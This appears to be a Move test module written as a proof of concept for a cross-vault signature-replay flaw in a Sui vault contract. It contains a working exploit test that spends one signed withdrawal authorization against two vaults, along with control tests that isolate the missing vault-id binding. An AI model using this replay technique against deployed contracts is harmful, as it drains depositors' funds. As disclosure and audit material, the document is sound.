#[test_only, allow(unused_use)]
/// PoC — cross-vault signature replay in dvault::active_vault.
///
/// `keccak_message()` binds the coin type but NOT the ActiveVault object id, while the signer set
/// lives in ONE shared global `Config`. The replay guards (`used_hashes`, `withdrawal_order_ids`)
/// are per-vault. So one off-chain authorization signed for a vault of coin `T` is valid against
/// EVERY ActiveVault<T> -> the same (order_id, signatures, message) double-withdraws.
///
/// All tests drive the real public entrypoints (`user_entry::deposit/withdraw`) and assert on the
/// attacker's actual Coin balance (L1 permissionless EOA entry, L2 named vault balances, L3 economic
/// gain). Signatures are freshly generated (PyNaCl) over a byte-exact reproduction of
/// `keccak_message`, so the positive path also proves the 2-of-2 ed25519 gate works end-to-end.
module dvault::astros_poc;

use dvault::active_vault::{Self, Config, ActiveVault};
use dvault::secure_vault::{Self, SecureVault};
use dvault::sui_test::{Self, SUI_TEST};
use dvault::usdc_test::{Self, USDC_TEST};
use dvault::user_entry;
use sui::balance;
use sui::clock;
use sui::coin::{Self, Coin, CoinMetadata};
use sui::object;
use sui::test_scenario as ts;

const ATTACKER: address = @0xa; // also the caller/recipient bound in the signed message

// Test signer keypairs (the same ones the repo's own tests use).
const PK1: vector<u8> = x"b9c6ee1630ef3e711144a648db06bbb2284f7274cfbee53ffcee503cc1a49200";
const PK2: vector<u8> = x"f1a756ceb2955f680ab622c9c271aa437a22aa978c34ae456f24400d6ea7ccdd";

// Fresh 2-of-2 signatures over keccak_message<USDC_TEST>(order_id=1, order_time=1, caller=0xa,
// amount=50, recipient=0xa, msg="poc"); hash=0x48391ca516f00ae965ffef8b5471c997dc4e83c600db750ad2f916fd7c71e04f
const SIG1: vector<u8> = x"3cadfa04a4030c5d6139f078a498078e61479015b067078ffa8df7ae5ed60546cbf88394f2d8f721df5a36d69b58aee8154321b774cefc3ab003ed22fb79d30e";
const SIG2: vector<u8> = x"e6543a1189e62b81761dd41a5b15c727974be2e99126705b2c0848e70d9c93bf64de5491719dc83f04e33881b4f808c2275fee294551f4df9d1630edffe4aa08";

fun sigs(): vector<vector<u8>> {
    let mut s = vector::empty<vector<u8>>();
    s.push_back(SIG1);
    s.push_back(SIG2);
    s
}

fun setup_signers(sc: &mut ts::Scenario) {
    ts::next_tx(sc, ATTACKER);
    active_vault::init_for_testing(sc.ctx());
    secure_vault::init_for_testing(sc.ctx());
    usdc_test::init_for_testing(sc.ctx());
    sui_test::init_for_testing(sc.ctx());

    ts::next_tx(sc, ATTACKER);
    let mut config = ts::take_shared<Config>(sc);
    active_vault::add_signer(&mut config, PK1, 1);
    active_vault::add_signer(&mut config, PK2, 2);
    assert!(active_vault::threshold(&config) == 2, 100);
    ts::return_shared(config);
}

#[test]
/// MAIN e2e: one 2-of-2 authorization, spent through user_entry::withdraw against TWO vaults,
/// pays the attacker twice. Funds enter via the real user_entry::deposit path.
fun test_e2e_one_authorization_drains_two_vaults() {
    let mut sc = ts::begin(ATTACKER);
    setup_signers(&mut sc);

    // create two USDC active+secure vault pairs sharing the same Config; record the active ids
    let (a1, a2);
    {
        ts::next_tx(&mut sc, ATTACKER);
        let mut config = ts::take_shared<Config>(&sc);
        let meta = ts::take_immutable<CoinMetadata<USDC_TEST>>(&sc);
        let mut v1 = active_vault::create_vault<USDC_TEST>(&meta, &mut config, 1, 1, sc.ctx());
        let mut v2 = active_vault::create_vault<USDC_TEST>(&meta, &mut config, 1, 1, sc.ctx());
        secure_vault::create_vault<USDC_TEST>(sc.ctx());
        secure_vault::create_vault<USDC_TEST>(sc.ctx());
        a1 = active_vault::vault_addr(&v1);
        a2 = active_vault::vault_addr(&v2);
        transfer::public_share_object(v1);
        transfer::public_share_object(v2);
        ts::return_immutable(meta);
        ts::return_shared(config);
    };

    // a victim deposits 100 into EACH vault via the real entrypoint user_entry::deposit
    let (sa1, sa2);
    {
        ts::next_tx(&mut sc, ATTACKER);
        let config = ts::take_shared<Config>(&sc);
        let mut v1 = ts::take_shared_by_id<ActiveVault<USDC_TEST>>(&sc, object::id_from_address(a1));
        let mut v2 = ts::take_shared_by_id<ActiveVault<USDC_TEST>>(&sc, object::id_from_address(a2));
        let mut s1 = ts::take_shared<SecureVault<USDC_TEST>>(&sc);
        sa1 = secure_vault::to_address(&s1);
        let c1 = coin::mint_for_testing<USDC_TEST>(100, sc.ctx());
        user_entry::deposit<USDC_TEST>(&config, &mut v1, &mut s1, c1, 100, sc.ctx());
        ts::return_shared(s1);
        let mut s2 = ts::take_shared<SecureVault<USDC_TEST>>(&sc);
        sa2 = secure_vault::to_address(&s2);
        let c2 = coin::mint_for_testing<USDC_TEST>(100, sc.ctx());
        user_entry::deposit<USDC_TEST>(&config, &mut v2, &mut s2, c2, 100, sc.ctx());
        ts::return_shared(s2);
        assert!(active_vault::balance_value(&v1) == 100 && active_vault::balance_value(&v2) == 100, 101);
        ts::return_shared(v1);
        ts::return_shared(v2);
        ts::return_shared(config);
    };
    let _ = sa1; let _ = sa2;

    // ATTACKER spends ONE 2-of-2 authorization (order_id=1) against BOTH vaults via user_entry::withdraw
    {
        ts::next_tx(&mut sc, ATTACKER);
        let config = ts::take_shared<Config>(&sc);
        let mut v1 = ts::take_shared_by_id<ActiveVault<USDC_TEST>>(&sc, object::id_from_address(a1));
        let mut v2 = ts::take_shared_by_id<ActiveVault<USDC_TEST>>(&sc, object::id_from_address(a2));
        let clk = clock::create_for_testing(sc.ctx());

        user_entry::withdraw<USDC_TEST>(
            &clk, &config, &mut v1, 1, 1, 50, ATTACKER, sigs(), b"poc", sc.ctx(),
        );
        user_entry::withdraw<USDC_TEST>(
            &clk, &config, &mut v2, 1, 1, 50, ATTACKER, sigs(), b"poc", sc.ctx(),
        );

        assert!(active_vault::balance_value(&v1) == 50, 102);
        assert!(active_vault::balance_value(&v2) == 50, 103);

        clock::destroy_for_testing(clk);
        ts::return_shared(v1);
        ts::return_shared(v2);
        ts::return_shared(config);
    };

    // settle: the attacker now holds TWO Coin<USDC> totalling 100 from a SINGLE 50-authorization
    {
        ts::next_tx(&mut sc, ATTACKER);
        let c_a = ts::take_from_address<Coin<USDC_TEST>>(&sc, ATTACKER);
        let c_b = ts::take_from_address<Coin<USDC_TEST>>(&sc, ATTACKER);
        let total = coin::value(&c_a) + coin::value(&c_b);
        assert!(total == 100, 104); // 50 authorized -> 100 extracted
        ts::return_to_address(ATTACKER, c_a);
        ts::return_to_address(ATTACKER, c_b);
    };

    ts::end(sc);
}

#[test]
#[expected_failure] // aborts EORDER_ID_ALREADY_USED (10014) on the second same-vault withdraw
/// Control: the SAME authorization replayed on the SAME vault aborts (per-vault guard works),
/// proving the only thing enabling the cross-vault drain is the missing vault-id binding.
fun test_same_vault_replay_is_blocked() {
    let mut sc = ts::begin(ATTACKER);
    setup_signers(&mut sc);
    ts::next_tx(&mut sc, ATTACKER);
    let mut config = ts::take_shared<Config>(&sc);
    let meta = ts::take_immutable<CoinMetadata<USDC_TEST>>(&sc);
    let mut v1 = active_vault::create_vault<USDC_TEST>(&meta, &mut config, 1, 1, sc.ctx());
    active_vault::direct_deposit(&mut v1, balance::create_for_testing<USDC_TEST>(100), sc.ctx());
    let clk = clock::create_for_testing(sc.ctx());
    let b1 = active_vault::withdraw<USDC_TEST>(&mut v1, &clk, &config, 1, 1, ATTACKER, 50, ATTACKER, sigs(), b"poc");
    let b2 = active_vault::withdraw<USDC_TEST>(&mut v1, &clk, &config, 1, 1, ATTACKER, 50, ATTACKER, sigs(), b"poc"); // aborts
    balance::destroy_for_testing(b1);
    balance::destroy_for_testing(b2);
    clock::destroy_for_testing(clk);
    transfer::public_share_object(v1);
    ts::return_immutable(meta);
    ts::return_shared(config);
    ts::end(sc);
}

#[test]
#[expected_failure] // aborts ETHRESHOLD_TOO_LOW (10010): USDC signatures do not verify for a SUI vault
/// Control: the coin-type binding that IS present works — a USDC-typed authorization is rejected on a
/// SUI_TEST vault (different `T` -> different keccak hash -> signatures fail). This isolates the defect
/// to the *missing vault-id* binding, not a broken signature scheme.
fun test_cross_coin_type_not_replayable() {
    let mut sc = ts::begin(ATTACKER);
    setup_signers(&mut sc);
    ts::next_tx(&mut sc, ATTACKER);
    let mut config = ts::take_shared<Config>(&sc);
    let meta = ts::take_immutable<CoinMetadata<SUI_TEST>>(&sc);
    let mut v = active_vault::create_vault<SUI_TEST>(&meta, &mut config, 1, 1, sc.ctx());
    active_vault::direct_deposit(&mut v, balance::create_for_testing<SUI_TEST>(100), sc.ctx());
    let clk = clock::create_for_testing(sc.ctx());
    // same params, same USDC signatures, but on a SUI_TEST vault -> threshold check fails
    let b = active_vault::withdraw<SUI_TEST>(&mut v, &clk, &config, 1, 1, ATTACKER, 50, ATTACKER, sigs(), b"poc");
    balance::destroy_for_testing(b);
    clock::destroy_for_testing(clk);
    transfer::public_share_object(v);
    ts::return_immutable(meta);
    ts::return_shared(config);
    ts::end(sc);
}
